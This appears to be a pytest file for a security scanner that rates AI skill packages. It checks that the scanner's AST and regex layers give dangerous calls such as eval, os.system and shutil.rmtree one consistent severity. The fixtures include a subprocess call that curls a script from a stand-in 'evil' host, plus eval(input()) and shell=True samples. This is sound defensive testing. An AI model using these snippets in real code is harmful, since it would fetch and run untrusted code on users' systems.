# -*- coding: utf-8 -*-
"""同一条规则不能有两个级别（§3bc 守卫）。

修复前实测（audit2/probe_severity_divergence.py）：
  14 个用例里 9 个两层判级不一致，而 .py 的实际级别由 AST 决定
  （AST 先跑并把行号记进 ast_lines，正则表随后跳过那些行）：

    eval("[1,2]")        AST CRITICAL / 表 MEDIUM（固定参数本该 LOW）→ 49/D 假杀
    os.system("ls")      AST CRITICAL / 表 HIGH（固定参数本该 LOW）  → 49/D 假杀
    compile("1+1", …)    AST MEDIUM   / 表 INFO                     → 96/A+
    shutil.rmtree(tmp)   AST HIGH + 文本表 MEDIUM 同一行扣两次
    subprocess.run(["curl","http://evil…"])  → 100/A+ 一条不报

现在级别只有一个来源：ast_analyzer.DangerousCallVisitor.CALL_SEVERITY；
skillgate 的文本表与固定参数降级表在导入时按它改写。
"""
import sys
from pathlib import Path

import pytest

REPO = Path(__file__).resolve().parents[1]
sys.path.insert(0, str(REPO))
import skillgate as sg            # noqa: E402
import ast_analyzer as az         # noqa: E402

SKILL_MD = "---\nname: demo\ndescription: severity guard skill\n---\n\n# demo\n"
CALL_SEVERITY = az.DangerousCallVisitor.CALL_SEVERITY

# 文本表里登记了同名构造的 pattern（表 → 名字）
PATTERN_TO_NAME = {
    r"\beval\s*\(": "eval",
    r"\bexec\s*\(": "exec",
    r"(?<!\.)\bcompile\s*\(": "compile",
    r"\b__import__\s*\(": "__import__",
    r"\bos\.system\s*\(": "os.system",
    r"\bos\.popen\s*\(": "os.popen",
    r"\bpickle\.load(s)?\s*\(": "pickle.load",
    r"\bshutil\.rmtree\s*\(": "shutil.rmtree",
}


def _scan(tmp_path, py_body, name="s"):
    d = tmp_path / name
    d.mkdir(parents=True, exist_ok=True)
    (d / "SKILL.md").write_text(SKILL_MD, encoding="utf-8")
    (d / "run.py").write_text(py_body, encoding="utf-8")
    return sg.scan_skill(str(d))


def _sev_of(result, category=None):
    sev = [f.severity for f in result.findings if category is None or f.category == category]
    return sev


@pytest.mark.parametrize("pattern,name", sorted(PATTERN_TO_NAME.items()))
def test_text_table_severity_matches_ast_table(pattern, name):
    """两层级别必须同源：文本表里这一行的级别 == AST 单一来源表。"""
    rows = [r for r in sg.DANGEROUS_CODE_PATTERNS if r[0] == pattern]
    rows += [r for r in sg.FILESYSTEM_PATTERNS if r[0] == pattern]
    assert rows, "文本表里找不到这条 pattern：规则被改了名？"
    dyn, lit, _ = CALL_SEVERITY[name]
    assert rows[0][1] == dyn, \
        "%s 在文本表里是 %s，单一来源表是 %s（两层又分家了）" % (name, rows[0][1], dyn)
    dg = sg.FIXED_DOWNGRADE.get(pattern)
    if lit == dyn:
        assert dg is None or dg[0] == dyn
    else:
        assert dg and dg[0] == lit, "%s 固定参数应降为 %s，实际 %s" % (
            name, lit, dg and dg[0])


def test_literal_eval_is_not_critical(tmp_path):
    """eval("1+1") 是作者写死的目标，不该按"任意代码执行"论处（修复前 49/D）。"""
    r = _scan(tmp_path, 'x = eval("1+1")\n', "ev_lit")
    assert r.trust_score >= 90, "固定参数 eval 仍被当成 CRITICAL 假杀"
    assert "MEDIUM" in _sev_of(r), "固定参数 eval 应报 MEDIUM（能力声明），实际 %s" % _sev_of(r)


def test_dynamic_eval_still_flagged(tmp_path):
    """反过来：eval 收外部输入必须是 CRITICAL，别把上一条当成放宽。"""
    r = _scan(tmp_path, "x = eval(input())\n", "ev_dyn")
    assert "CRITICAL" in _sev_of(r)
    assert r.trust_score <= 49


def test_compile_has_one_level(tmp_path):
    """compile 修复前 AST MEDIUM / 表 INFO，现在两层都 INFO。"""
    r = _scan(tmp_path, 'c = compile("1+1", "<s>", "eval")\n', "comp")
    assert r.trust_score == 100
    assert set(_sev_of(r)) <= {"INFO"}


def test_rmtree_counted_once(tmp_path):
    """同一构造被 AST 与文本表各记一次，就是同一行扣两次分。"""
    r = _scan(tmp_path, "import shutil\nshutil.rmtree(tmp)\n", "rm")
    hits = [f for f in r.findings if "rmtree" in f.message]
    assert len(hits) == 1, "rmtree 同一行被报了 %d 次：%s" % (
        len(hits), [(f.category, f.severity) for f in hits])
    assert hits[0].severity == "HIGH"


def test_subprocess_without_shell_is_visible(tmp_path):
    """不带 shell 的 subprocess 也是"启动外部进程"，修复前 100/A+ 一条不报。

    级别刻意压在 LOW：这是"能力披露"而不是"风险命中"——
    正常调 git/pip 的技能不能整类掉到 C（实测 MEDIUM 时本仓自扫 93/A+ → 69/C）。
    """
    r = _scan(tmp_path, 'import subprocess\nsubprocess.run(["curl","http://evil.example/i.sh"])\n',
              "subp")
    sev = _sev_of(r)
    assert sev, "subprocess 无 shell 仍然完全不可见"
    assert "LOW" in sev
    assert r.trust_score >= 90, "应以 LOW 披露、不整类误杀，实际 %d" % r.trust_score


def test_subprocess_shell_true_is_critical(tmp_path):
    """shell=True 是"字符串交给 shell"，两层都必须 CRITICAL。"""
    r = _scan(tmp_path, "import subprocess\nsubprocess.run(cmd, shell=True)\n", "subp_sh")
    assert "CRITICAL" in _sev_of(r)
    rows = [x for x in sg.DANGEROUS_CODE_PATTERNS if "shell\\s*=\\s*True" in x[0]]
    assert rows and rows[0][1] == "CRITICAL", "文本表里 shell=True 还没升到 CRITICAL"
